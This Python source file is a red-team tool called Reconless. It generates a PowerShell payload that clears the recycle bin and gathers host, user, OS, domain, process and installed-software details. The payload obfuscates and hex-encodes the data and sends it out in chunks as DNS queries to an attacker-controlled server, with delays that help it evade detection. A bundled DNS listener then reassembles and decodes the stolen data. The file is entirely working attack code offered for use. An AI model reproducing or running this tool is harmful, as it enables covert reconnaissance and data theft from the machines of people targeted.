import argparse
import random
import string
from datetime import datetime
from dnslib.server import DNSServer, BaseResolver, DNSLogger
from dnslib import RR, QTYPE, A

parser = argparse.ArgumentParser(description='Reconless is a DNS listener tool that can be used by red team / pentest teams in reconnaissance and exfiltration phases.')
parser.add_argument('-d', '--domain', required=True, type=str, help='Your domain (e.g domain.test)')
parser.add_argument('-ip', type=str, help='Authoritative DNS server IP for generated script')
parser.add_argument('-gs', '--generated-script', action='store_true', help='Generate powershell script with given domain and ip')
parser.add_argument('-l', '--log', action='store_true', help='Log exfiltrated data to file per client IP')
args = parser.parse_args()

banner = """
 * Hallowed be our -> \033[91m Red Team \033[0m <- engagement
 ██▀███  ▓█████  ▄████▄   ▒█████   ███▄    █  ██▓    ▓█████   ██████   ██████  - L
▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓██▒    ▓█   ▀ ▒██    ▒ ▒██    ▒  - I
▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒██░    ▒███   ░ ▓██▄   ░ ▓██▄    - M
▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒▒██░    ▒▓█  ▄   ▒   ██▒  ▒   ██▒ - 4
░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░░██████▒░▒████▒▒██████▒▒▒██████▒▒ - W
░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ - 4
  ░▒ ░ ▒░ ░ ░  ░  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ - R
  ░░   ░    ░   ░        ░ ░ ░ ▒     ░   ░ ░   ░ ░      ░   ░  ░  ░  ░  ░  ░   - E
   ░        ░  ░░ ░          ░ ░           ░     ░  ░   ░  ░      ░        ░                                                         
"""
print(banner)

if args.generated_script:
    if args.ip:
        ip = args.ip
        domain = args.domain
        filename = f"NotBeacon_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}.ps1"
        powershell_script = f'''try{{Clear-RecycleBin -Force -ErrorAction SilentlyContinue}}catch{{}};$hostname=$env:COMPUTERNAME;$user=$env:USERNAME;$osInfo=Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,BuildNumber;$disk=Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|Select-Object DeviceID,@{{Name="FreeGB";Expression={{"{{0:N2}}" -f ($_.FreeSpace/1GB)}}}},@{{Name="TotalGB";Expression={{"{{0:N2}}" -f ($_.Size/1GB)}}}};$apps=Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*|Select-Object DisplayName;$procs=Get-Process|Select-Object Name;$domain=(Get-WmiObject Win32_ComputerSystem).Domain;$report=[PSCustomObject]@{{Hostname=$hostname;User=$user;OS="$($osInfo.Caption) - $($osInfo.Version) (Build $($osInfo.BuildNumber))";Domain=$domain;DiskInfo=$disk;RunningApps=$procs;InstalledApps=$apps}};$json=$report|ConvertTo-Json -Depth 3;$obf=$json -replace 'a','4' -replace 'e','3' -replace 'i','1' -replace 'o','0' -replace 'u','_' -replace '\\s','';$chunks=($obf -split '(.{{10}})'|Where-Object{{$_ -ne ''}});$domainBase="{domain}";foreach($c in $chunks){{$read=([System.Text.Encoding]::UTF8.GetBytes($c)|ForEach-Object{{$_.ToString("x2")}}) -join "";$sub="$read.$domainBase";try{{Resolve-DnsName -Name $sub -Type A -Server {ip} -ErrorAction SilentlyContinue|Out-Null}}catch{{}};Start-Sleep -Milliseconds (Get-Random -Minimum 3000 -Maximum 3500)}}'''
        with open(filename, "w", encoding="utf-8") as f:
            f.write(powershell_script)
        print(f"[\x1b[1;92mGEN\033[0m] PowerShell payload generated and saved as \x1b[1;94m{filename}\033[0m in the current directory.")
    else:
        print("[\x1b[1;91mERROR\033[0m] IP is required to generate the script.")
    exit(0)

received_chunks = []
seen_ips = set()

class RedTeamDNSResolver(BaseResolver):
    def __init__(self):
        self.domain_base = args.domain.lower().strip('.')

    def resolve(self, request, handler):
        qname = str(request.q.qname).lower().strip('.')
        qtype = QTYPE[request.q.qtype]
        timestamp = datetime.now().strftime("%d-%m-%Y %H:%M")
        client_ip = handler.client_address[0]

        if qname.endswith(self.domain_base):
            subdomain = qname[:-(len(self.domain_base) + 1)]
            chunk_hex = subdomain.replace(".", "")
            try:
                chunk_bytes = bytes.fromhex(chunk_hex)
                chunk_str = chunk_bytes.decode("utf-8")
                received_chunks.append(chunk_str)
                deobsfuscated = (chunk_str.replace('4', 'a').replace('3', 'e').replace('1', 'i').replace('0', 'o').replace('_', 'u'))

                if client_ip not in seen_ips:
                    print(f"\n ├[\x1b[1;92mRECV\033[0m] Request received [{timestamp}]")
                    print(f" │    └[IP: {client_ip}] | TYPE: {qtype} | QNAME: \x1b[1;95m{qname}\033[0m")
                    seen_ips.add(client_ip)

                print(f" │      ├\x1b[1;94m[CHUNK]\033[0m → {chunk_str} → \x1b[1;94m{deobsfuscated}\033[0m")

                if args.log:
                    with open(f"{client_ip}.txt", "a", encoding="utf-8") as f:
                        f.write(f"{deobsfuscated}\n")
                    print(f" │      └\x1b[1;92m[SAVED]\033[0m Data written to \x1b[1;93m{client_ip}.txt\033[0m")

            except Exception:
                print(f"[FAIL] Error decoding chunk from {client_ip}")
        else:
            print(f"[\x1b[1;91mFAIL\033[0m] Unrecognized QNAME: {qname}")

        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=60))
        return reply

resolver = RedTeamDNSResolver()
print("[\x1b[1;94mINFO\033[0m] Starting UDP server in 0.0.0.0:53")
print(" ├[\x1b[1;94mOK\033[0m] Target Domain:", args.domain)

try:
    logger = DNSLogger(log="-request,-reply", prefix=False)
    udp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False, logger=logger)
    udp_server.start_thread()
    print(" ├[\x1b[1;94mOK\033[0m] Server UP! Waiting for connections")
    print("[\x1b[1;92mDONE\033[0m] All Done! Waiting for requests")
except Exception as e:
    print(" └[\x1b[1;91mERROR\033[0m] Failed to start listener:", e)

try:
    while True:
        cmd = input(" ├[\x1b[1;94mCMD\033[0m] Type <print> to see all info, <clear> to reset:\n> ")
        if cmd == "print":
            if received_chunks:
                obfuscated = "".join(received_chunks)
                json_clean = (obfuscated.replace('4', 'a').replace('3', 'e').replace('1', 'i').replace('0', 'o').replace('_', 'u'))
                print("\n ├[\x1b[1;94mLOOT\033[0m] Full data:")
                print(f"  → \x1b[1;94m{json_clean}\033[0m")
            else:
                print("[WAIT] No data received yet...")
        elif cmd == "clear":
            received_chunks.clear()
            seen_ips.clear()
            print("[CLEAR] Memory reset")
except KeyboardInterrupt:
    print("\n[QUIT] Listener terminated.")
